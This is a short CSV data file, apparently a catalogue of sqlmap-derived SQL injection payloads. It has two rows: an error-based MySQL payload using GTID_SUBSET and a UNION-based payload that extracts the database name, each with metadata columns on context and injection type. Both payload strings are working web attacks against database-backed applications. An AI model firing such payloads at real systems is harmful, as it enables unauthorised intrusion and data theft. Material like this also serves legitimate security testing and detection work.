payload_id,payload,context,columns,comment_style,marker_column_left,marker_column_right,extraction_expr,injection_type,valid_without_waf,status_code,response_len,notes
sqlmap_0001,"1' AND GTID_SUBSET(CONCAT(0x716b717a71,(SELECT (ELT(8653=8653,1))),0x7162787171),8653)-- pfFU",single_quote,,,,,,error,yes,,,"sqlmap:MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)"
sqlmap_0002,"-7447' UNION ALL SELECT database(),'SEQSQLI_START','SEQSQLI_END'-- -",single_quote,3,dash,2,3,database(),union,yes,,,sqlmap:Generic UNION query (NULL) - 3 columns
